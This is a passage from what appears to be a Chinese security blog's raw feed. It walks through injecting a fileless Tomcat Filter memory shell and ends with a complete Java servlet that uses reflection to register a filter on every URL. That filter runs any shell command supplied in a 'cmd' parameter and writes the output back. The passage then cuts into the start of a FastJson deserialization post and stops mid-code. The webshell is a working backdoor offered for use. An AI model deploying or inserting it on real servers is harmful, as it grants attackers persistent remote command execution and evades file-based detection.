filterMaps.length;<br><br>                <span class="hljs-keyword">for</span>(var12 = <span class="hljs-number">0</span>; var12 &lt; var11; ++var12) &#123;<br>                    filterMap = var10[var12];<br>                    <span class="hljs-keyword">if</span> (matchDispatcher(filterMap, dispatcher) &amp;&amp; matchFiltersServlet(filterMap, servletName)) &#123;<br>                        filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());<br>                        <span class="hljs-keyword">if</span> (filterConfig != <span class="hljs-literal">null</span>) &#123;<br>                            filterChain.addFilter(filterConfig);<span class="hljs-comment">//这里会进行匹配</span><br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">return</span> filterChain;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> filterChain;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>大体意思如下</p><ol><li>首先会调用<code>context.findFilterMaps</code>方法中context中获取FilterMaps</li><li>之后会在箭头所指位置匹配</li><li>如果匹配，就会调用<code>context.findFilterConfig</code>从context中获取FilterConfig</li><li>如果存在对应的filterConfig，将会将其添加进入filterChain链中</li></ol><p>上面就是完整的Tomcat容器获取filterChain中的动态过程，所以如果我们想要注入内存马我们需要把马注入到FilterChain中，而我们上面说过了FilterChain的调用过程是这样子的</p><blockquote><p>FilterChain</p><p>-&gt;一个<code>ApplicationFilterChain</code>类对象，是通过调用<code>ApplicationFilterFactory.createFilterChain</code>方法</p><p>-&gt;<code>context.findFilterMaps</code>方法中context中获取FilterMaps</p><p>-&gt;匹配</p><p>-&gt;如果匹配，就会调用<code>context.findFilterConfig</code>从context中获取FilterConfig</p><p>-&gt;添加到FilterChain中</p></blockquote><p>所以我们的构造思路如下</p><ol><li>在context中的filterMaps属性中添加filterMap</li><li>在filterConfigs中添加filterConfig</li><li>而且要保证两个的filterName相同</li></ol><p>解决的方案如下</p><ul><li>调用 ApplicationContext 的 addFilter 方法创建 filterDefs 对象，需要反射修改应用程序的运行状态，加完之后再改回来；</li></ul><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230420190313701.png" alt="image-20230420190313701"> </p><p> 成功加入到了context中</p><ul><li>接下来我们再filterConfigs中添加findFilterConfig，点击findFilterConfig，查看用法</li></ul><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230420191104760.png" alt="image-20230420191104760"> </p><p>因为return了filterConfigs，查看用法</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230420191145595.png" alt="image-20230420191145595"> </p><p>从而能够将我们的filterConfigs放入</p><ul><li><p>我们现在还缺少一个filterMap，调用 ApplicationFilterRegistration 的 addMappingForUrlPatterns 生成 filterMaps；</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230420192549961.png" alt="image-20230420192549961"></p></li></ul><p>​<strong>到底是怎么找到的这个类呀</strong></p><ul><li>为了兼容某些特殊情况，将我们加入的 filter 放在 filterMaps 的第一位，可以自己修改 HashMap 中的顺序，也可以在自己调用 StandardContext 的 addFilterMapBefore 直接加在 filterMaps 的第一位</li></ul><h3 id="手搓内存马"><a href="#手搓内存马" class="headerlink" title="手搓内存马"></a>手搓内存马</h3><p>既然有了上面讲的思路，那么接下来我们就开始一步一步的构造，一切的一切都首先需要找到<code>ServletContext</code>这个context才可以开始构造。</p><p>我这里是HttpServlet域下，可以从<code>request</code>作用域中获取<code>ServletContext</code>对象，之后又通过ServletContext获取ApplicationContext对象，再次通过ApplicationContext获取StandardContext对象，就这样，最终的到了我们需要的StandardContext对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//从request中获取ServletContext</span><br><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> req.getSession().getServletContext();<br><br><span class="hljs-comment">//从context中获取ApplicationContext对象</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>appctx.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<span class="hljs-comment">//获取反射对象context1所表示的字段在applicationContext对象中的值，并强制转换为StandardContext类型。</span><br><br><span class="hljs-comment">//从ApplicationContext中获取StandardContext对象</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>stdctx.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br></code></pre></td></tr></table></figure><p>之后就是创建一个自定义得Filter对象，其中在doFilter重写中，就是我们需要执行的处理位置，我这是使用了执行命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>    <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) servletRequest;<span class="hljs-comment">//便于获取http请求</span><br>    <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> resp.getWriter();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        String[] commands = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">3</span>];<br>        <span class="hljs-type">String</span> <span class="hljs-variable">charsetName</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;window&quot;</span>) ? <span class="hljs-string">&quot;GBK&quot;</span>:<span class="hljs-string">&quot;UTF-8&quot;</span>;<br>        <span class="hljs-comment">//根据系统的操作系统类型，确定命令输出的字符集编码为 GBK 还是 UTF-8。</span><br>        <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="hljs-string">&quot;WIN&quot;</span>)) &#123;<br>            commands[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;cmd&quot;</span>;<br>            commands[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;/c&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            commands[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>            commands[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-c&quot;</span>;<br>        &#125;<br>        commands[<span class="hljs-number">2</span>] = cmd;<br>        <span class="hljs-keyword">try</span> &#123;<br>            writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;println&quot;</span>, String.class).invoke(writer, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next());<span class="hljs-comment">//通过反射调用 PrintWriter 对象的 println 方法，将执行系统命令后的输出写入到 HTTP 响应中。</span><br>            writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;flush&quot;</span>).invoke(writer);<br>            <span class="hljs-comment">//通过反射调用 PrintWriter 对象的 flush 方法，将输出缓冲区的内容刷新到 HTTP 响应中。</span><br>            writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;close&quot;</span>).invoke(writer);<br>            <span class="hljs-keyword">return</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>    filterChain.doFilter(servletRequest, servletResponse);<br>&#125;<br></code></pre></td></tr></table></figure><p>再然后就是创建一个FilterDef对象，写入filter &#x2F; fitlerName &#x2F; filterClass等信息。这里面分别对应我们前面提到的addFilter中队FIlterDef进行的操作，我也在上面给出了对应的注释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>filterDef.setFilter(filter);<br>filterDef.setFilterName(name);<br>filterDef.setFilterClass(filter.getClass().getName());<br></code></pre></td></tr></table></figure><p>创建FilterMap对象，添加url映射，下面是直接拦截所有资源<code>/*。</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>filterMap.setFilterName(name);<br><span class="hljs-comment">//这个不要忘记了</span><br>filterMap.setDispatcher(DispatcherType.REQUEST.name());<br></code></pre></td></tr></table></figure><p>最后通过<code>addFilterMapBefore</code>方法的调用将filterMap方法最前面，并且将所有东西都放入<code>filterConfig</code>中去。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);<br><br>filterConfigs.put(name, filterConfig);<br></code></pre></td></tr></table></figure><p>所以完整的payload如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationContext;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;<br><span class="hljs-keyword">import</span> org.apache.catalina.Context;<br><br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AddTomcatFilter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-built_in">this</span>.doPost(req, resp);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;RoboTerh&quot;</span>;<br>            <span class="hljs-comment">//从request中获取ServletContext</span><br>            <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> req.getSession().getServletContext();<br><br>            <span class="hljs-comment">//从context中获取ApplicationContext对象</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            appctx.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br><br>            <span class="hljs-comment">//从ApplicationContext中获取StandardContext对象</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>            stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br><br>            <span class="hljs-comment">//从StandardContext中获得filterConfigs这个map对象</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>            Configs.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br><br>            <span class="hljs-comment">//如果这个过滤器名字没有注册过</span><br>            <span class="hljs-keyword">if</span> (filterConfigs.get(name) == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">//自定义一个Filter对象</span><br>                <span class="hljs-type">Filter</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Filter</span>() &#123;<br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>                    &#125;<br><br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>                        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) servletRequest;<br>                        <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> resp.getWriter();<br>                            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>                            String[] commands = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">3</span>];<br>                            <span class="hljs-type">String</span> <span class="hljs-variable">charsetName</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;window&quot;</span>) ? <span class="hljs-string">&quot;GBK&quot;</span>:<span class="hljs-string">&quot;UTF-8&quot;</span>;<br>                            <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="hljs-string">&quot;WIN&quot;</span>)) &#123;<br>                                commands[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;cmd&quot;</span>;<br>                                commands[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;/c&quot;</span>;<br>                            &#125; <span class="hljs-keyword">else</span> &#123;<br>                                commands[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>                                commands[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-c&quot;</span>;<br>                            &#125;<br>                            commands[<span class="hljs-number">2</span>] = cmd;<br>                            <span class="hljs-keyword">try</span> &#123;<br>                                writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;println&quot;</span>, String.class).invoke(writer, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next());<br>                                writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;flush&quot;</span>).invoke(writer);<br>                                writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;close&quot;</span>).invoke(writer);<br>                                <span class="hljs-keyword">return</span>;<br>                            &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) &#123;<br>                                e.printStackTrace();<br>                            &#125;<br><br>                        &#125;<br>                        filterChain.doFilter(servletRequest, servletResponse);<br>                    &#125;<br><br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>                    &#125;<br><br>                &#125;;<br><br>                <span class="hljs-comment">//创建FilterDef对象 并添加 filter对象，filtername, filter类</span><br>                <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>                filterDef.setFilter(filter);<br>                filterDef.setFilterName(name);<br>                filterDef.setFilterClass(filter.getClass().getName());<br>                <span class="hljs-comment">//通过addFilterDef方法添加 filterDef 方法</span><br>                standardContext.addFilterDef(filterDef);<br><br>                <span class="hljs-comment">//创建FilterMap对象，并添加 filter映射，filtername</span><br>                <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>                filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>                filterMap.setFilterName(name);<br>                <span class="hljs-comment">//这个不要忘记了，它设置了Filter（过滤器）在处理HttpServletRequest（HTTP请求）时的Dispatcher类型</span><br>                filterMap.setDispatcher(DispatcherType.REQUEST.name());<br><br>                <span class="hljs-comment">//通过addFilterMapBefore方法添加filterMap对象</span><br>                standardContext.addFilterMapBefore(filterMap);<br><br>                <span class="hljs-comment">//通过前面获取的filtermaps的put方法放入filterConfig</span><br>                <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);<br>                constructor.setAccessible(<span class="hljs-literal">true</span>);<br>                <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);<br><br>                filterConfigs.put(name, filterConfig);<br><br>                <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> resp.getWriter();<br>                out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br>            &#125;<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>FastJson反序列化</title>
    <link href="/decemberus.com/2023/01/03/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/decemberus.com/2023/01/03/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="FastJson反序列化"><a href="#FastJson反序列化" class="headerlink" title="FastJson反序列化"></a>FastJson反序列化</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>引入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>创建测试User类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> String hobby;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age, String hobby)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.hobby = hobby;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了setname&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getHobby</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> hobby;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setHobby</span><span class="hljs-params">(String hobby)</span> &#123;<br>        <span class="hljs-built_in">this</span>.hobby = hobby;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, hobby=&#x27;&quot;</span> + hobby + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    